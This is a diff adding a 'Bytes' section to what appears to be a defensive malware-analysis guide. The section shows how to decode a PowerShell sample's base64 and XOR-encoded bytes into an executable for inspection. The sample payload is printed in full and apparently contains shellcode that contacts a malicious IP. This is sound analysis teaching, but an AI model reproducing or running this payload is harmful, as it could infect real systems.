@@ -2840,6 +2840,7 @@ If we click on _Extras_ we get insightful information about the legitimate filep
 
   + [Straight Forward Ocassions](#straight-forward-ocassions)
   + [Obfuscation](#Obfuscation)
+  + [Bytes](#bytes)	
 
 </details>
 
@@ -2976,6 +2977,44 @@ Let's remove the IEX at the bottom, and neutralise the job by commenting it out
 ![image](https://user-images.githubusercontent.com/44196051/122642412-37b9df00-d102-11eb-8be2-58be82b88062.png)
 
 ....to be continued!!!
+
+
+### Bytes
+
+Here's a seperate bit of Powershell malware. I decoded it up to a point, and I want to focus on some easy ways to decode BYTES. 
+
+```powershell
+If ([IntPtr]::size -eq 8) {
+	[Byte[]]$var_code = [System.Convert]::FromBase64String('32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbKsCMjI3lrquJim5giIyNuEupicmJySSBicmKZdKq85dz2yFp4a6riaxLxaqr7bhLqcUsjEeOncXFimch2DRjc9muq5Wug4HNJKXxrqtKZPCMjI0kjS6MQIyNqqsNimicjIyNimVZlvaXc9muq0muq+Wrk49zc3NxuEupxcWKZDiU7WNz2puMspr4iIyNr3Owsp68iIyPIkMrHIiMjy6Hc3NwMQlNKDFURDERGV3xLRkJHRlEcVlZKRx4QQhEQQkcTQQ4QQhsXDhcVQkUOQRRARw5AFkAWFRIbFBtGRhMjQEI91OUC8tO7DI3t7FEHxV0CI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxITDRMYA3RKTUdMVFADbXcDFQ0RGAN0bHQVFxgDd1FKR0ZNVwwVDRMYA25id2FpcAouKSMOmn/nY6mYOw5OQVNyftKp9hpItf3rAbs0ProvN/ccyuALAatbGBGOWJ2NY+zQ/glsuFaoh0pqIXHzPcoRtOWLPDHqUFS735Fjso5bxJ9e8WkKLcJfw5i/lpyFM60nu4hpKQz2ElgTcYb6/ce+ekpvIrjtcwE3LAHdTvge4DGT6u006lHMLUmGLrhFP/5fdz80Zw2UZezRXANuIpdmpZ4GKmmgJReSqSlU+E+oZhALFm+qEsWFRJxs0Un+JOkQGqMtlgRAcHDF93uo/DzGDM8myCNindOWgXXc9msS6pkjI2MjYpsjMyMjYppjIyMjYpl7h3DG3PZrsHBwa6rEa6rSa6r5YpsjAyMjaqraYpkxtarB3PZroOcDpuNXlUWoJGsi4KbjVvR7e3trJiMjIyNz4Mtc3tzcEhsWDRIaGw0WFA0SFhYjMRd1Ww==')
+
+	for ($x = 0; $x -lt $var_code.Count; $x++) {
+		$var_code[$x] = $var_code[$x] -bxor 35
+	}
+}
+```
+
+First, push it as a $variable in powershell
+
+```powershell
+$malware = [put the above string here]
+```
+<img width="890" alt="Screenshot 2022-01-18 at 13 40 33" src="https://user-images.githubusercontent.com/44196051/149948196-8705d331-4a1a-4f17-811e-af69928b29db.png">
+
+If we `echo $malware" we can see we get some numbers. These are likely bytes. 
+
+<img width="406" alt="Screenshot 2022-01-18 at 13 41 34" src="https://user-images.githubusercontent.com/44196051/149948344-e014b6c6-0878-48a5-a3af-bb7805845f28.png">
+
+We can push these bytes straight into an .exe
+
+```powershell
+[System.IO.File]::WriteAllBytes(".\evil.exe", $malware)
+```
+
+Then we can string the evil.exe, and we can see that it includes a bad IP, confirming this was indeed malware!
+
+<img width="653" alt="Screenshot 2022-01-18 at 13 45 52" src="https://user-images.githubusercontent.com/44196051/149949086-888afd9b-8de6-415c-949c-c8ffbb78d0b4.png">
+
+
 
 # SOC
 
